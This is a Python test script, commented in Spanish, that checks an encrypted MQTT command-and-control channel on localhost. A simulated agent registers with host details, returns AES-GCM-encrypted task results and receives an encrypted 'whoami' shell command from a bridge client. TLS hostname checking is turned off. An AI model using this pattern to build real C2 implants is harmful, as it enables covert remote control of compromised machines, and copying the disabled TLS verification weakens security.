#!/usr/bin/env python3
"""Prueba completa del canal C2 desde una sola terminal.

Verifica que el broker ACEPTA cada publicación (on_publish con rc=0)
y que el agente recibe y descifra comandos correctamente.

Uso:
    python3 test_full.py
"""

import json
import time
import paho.mqtt.client as mqtt
from crypto_lib.cipher import Cipher

# ── Config ──────────────────────────────────
BROKER = "localhost"
PORT = 8883
CA = "config/certs/ca.crt"
AGENT_CERT = "config/certs/agent.crt"
AGENT_KEY = "config/certs/agent.key"
AGENT_ID = "AG001"
PSK_FILE = "crypto_lib/psk.key"
PUB_TIMEOUT = 5.0  # segundos para esperar ack del broker
# ────────────────────────────────────────────

received_commands = []
publish_acks = {}     # mid -> "ok" / "fail(reason)"
step = 0

def step_print(n, msg):
    print(f"\n─── Step {n}: {msg} ───")

def check_ack(topic_label):
    """Espera y valida que el broker haya aceptado la publicación."""
    deadline = time.time() + PUB_TIMEOUT
    while time.time() < deadline:
        # Buscar si hay algún ack reciente para este test
        for mid, status in list(publish_acks.items()):
            if status == "ok":
                del publish_acks[mid]
                return True
            elif status.startswith("fail"):
                print(f"  ❌ Broker RECHAZÓ {topic_label} (rc={status})")
                return False
        time.sleep(0.1)
    print(f"  ❌ Timeout esperando ack del broker para {topic_label}")
    return False

# ── Cargar PSK ──────────────────────────────
step_print(1, "Cargando PSK")
with open(PSK_FILE, "rb") as f:
    key = f.read()
cipher = Cipher(key, state_file="/tmp/test_full.state")
print(f"  ✅ PSK cargada ({len(key)} bytes)")

# ── Conectar agente al broker ───────────────
step_print(2, "Conectando agente al broker")

def on_connect_agent(client, userdata, flags, rc, properties=None):
    print(f"  ✅ Conectado (rc={rc})")
    client.subscribe(f"c2/cmd/{AGENT_ID}", qos=1)

def on_message_agent(client, userdata, msg):
    print(f"\n  📩 Comando recibido en {msg.topic}")
    try:
        comando = json.loads(cipher.decrypt_from_json(msg.payload.decode()))
        print(f"  ✅ Descifrado: {json.dumps(comando, indent=2)}")
        received_commands.append(comando)
    except Exception as e:
        print(f"  ❌ Error descifrando: {e}")
        received_commands.append({"error": str(e)})

def on_publish_agent(client, userdata, mid, reason_code, properties=None):
    if reason_code < 128:  # MQTT5: < 128 = éxito (0=Success, 16=NoMatchingSubscribers)
        publish_acks[mid] = "ok"
    else:
        publish_acks[mid] = f"fail({reason_code})"

agent = mqtt.Client(
    client_id=AGENT_ID,
    callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
    protocol=mqtt.MQTTv5,
)
agent.tls_set(CA, certfile=AGENT_CERT, keyfile=AGENT_KEY)
agent.tls_insecure_set(True)
agent.on_connect = on_connect_agent
agent.on_message = on_message_agent
agent.on_publish = on_publish_agent

agent.connect(BROKER, PORT, 60)
agent.loop_start()
time.sleep(0.5)


# ── Enviar REGISTER ─────────────────────────
step_print(3, "Enviando REGISTER (plano)")
register = {
    "agent_id": AGENT_ID,
    "hostname": "test-terminal",
    "os": "Linux",
    "username": "test",
}
info = agent.publish("c2/agents/register", json.dumps(register), qos=1)
print(f"  📤 Publicado en c2/agents/register (rc={info.rc})")
if check_ack("REGISTER"):
    print(f"  ✅ Broker aceptó REGISTER")
    print(f"  📄 Payload: {json.dumps(register)}")
else:
    print(f"  ❌ REGISTER RECHAZADO — revisar ACL")
    exit(1)


# ── Enviar RESULT cifrado ───────────────────
step_print(4, "Enviando RESULT (cifrado con AES-GCM)")
result_plain = {
    "task_id": "TEST001",
    "agent_id": AGENT_ID,
    "status": "completed",
    "output": "HOLA MUNDO DESDE EL TERMINAL",
}
result_encrypted = cipher.encrypt(json.dumps(result_plain))
info = agent.publish(f"c2/res/{AGENT_ID}", json.dumps(result_encrypted), qos=1)

print(f"  📤 Publicado en c2/res/{AGENT_ID} (rc={info.rc})")
if check_ack("RESULT"):
    print(f"  ✅ Broker aceptó RESULT")
    print(f"  📄 Payload cifrado:")
    print(f"      iv:  {result_encrypted['iv'][:20]}...")
    print(f"      ct:  {result_encrypted['ciphertext'][:20]}...")
    print(f"      tag: {result_encrypted['tag'][:20]}...")

    # Verificar que se descifra correctamente
    verificado = json.loads(cipher.decrypt(result_encrypted))
    assert verificado["output"] == "HOLA MUNDO DESDE EL TERMINAL", "Fallo verificación"
    print(f'  ✅ Verificación: descifrado OK → "{verificado["output"]}"')
else:
    print(f"  ❌ RESULT RECHAZADO — revisar ACL")
    exit(1)

time.sleep(0.3)


# ── Publicar COMMAND desde otro cliente ─────
step_print(5, "Publicando COMMAND (simulando al servidor)")

pub_publish_acks = {}

def on_connect_pub(client, userdata, flags, rc, properties=None):
    print(f"  ✅ Bridge conectado (rc={rc})")
    command_plain = {
        "task_id": "TASK999",
        "command": "whoami",
        "command_type": "shell",
    }
    command_encrypted = cipher.encrypt_to_json(json.dumps(command_plain))
    info = client.publish(f"c2/cmd/{AGENT_ID}", command_encrypted, qos=1)
    print(f"  📤 Comando cifrado y publicado en c2/cmd/{AGENT_ID} (rc={info.rc})")
    print(f"  📄 Contenido: {json.dumps(command_plain)}")

def on_publish_pub(client, userdata, mid, reason_code, properties=None):
    if reason_code < 128:  # MQTT5: < 128 = éxito
        pub_publish_acks[mid] = "ok"
    else:
        pub_publish_acks[mid] = f"fail({reason_code})"

pub = mqtt.Client(
    client_id="crypto-bridge",
    callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
    protocol=mqtt.MQTTv5,
)
pub.tls_set(CA, certfile="config/certs/bridge.crt", keyfile="config/certs/bridge.key")
pub.tls_insecure_set(True)
pub.on_connect = on_connect_pub
pub.on_publish = on_publish_pub
pub.connect(BROKER, PORT, 60)
pub.loop_start()

# Esperar ack del broker para el comando
deadline = time.time() + PUB_TIMEOUT
cmd_acked = False
while time.time() < deadline:
    for mid, status in list(pub_publish_acks.items()):
        if status == "ok":
            cmd_acked = True
            break
    if cmd_acked:
        break
    time.sleep(0.1)

if cmd_acked:
    print(f"  ✅ Broker aceptó COMMAND")
else:
    print(f"  ❌ Broker RECHAZÓ COMMAND — revisar ACL")
    exit(1)

# Esperar a que llegue el mensaje al agente
for _ in range(10):
    if received_commands:
        break
    time.sleep(0.5)

# Desconectar bridge
pub.loop_stop()
pub.disconnect()


# ── Verificar recepción ────────────────────
step_print(6, "Verificando recepción en el agente")
if received_commands:
    print(f"  ✅ Comando recibido y descifrado correctamente")
    print(f"  📄 task_id: {received_commands[0].get('task_id')}")
    print(f"  📄 command: {received_commands[0].get('command')}")
else:
    print(f"  ❌ No se recibió ningún comando")
    exit(1)


# ── Cleanup ─────────────────────────────────
agent.loop_stop()
agent.disconnect()
time.sleep(0.3)

print(f"\n{'='*50}")
print(f"  ✅ PRUEBA COMPLETA EXITOSA")
print(f"{'='*50}")
print(f"  ✔ Register:  broker ACEPTÓ + payload OK")
print(f"  ✔ Result:    broker ACEPTÓ + cifrado/descifrado OK")
print(f"  ✔ Command:   broker ACEPTÓ + agente recibió y descifró")
print(f"{'='*50}")
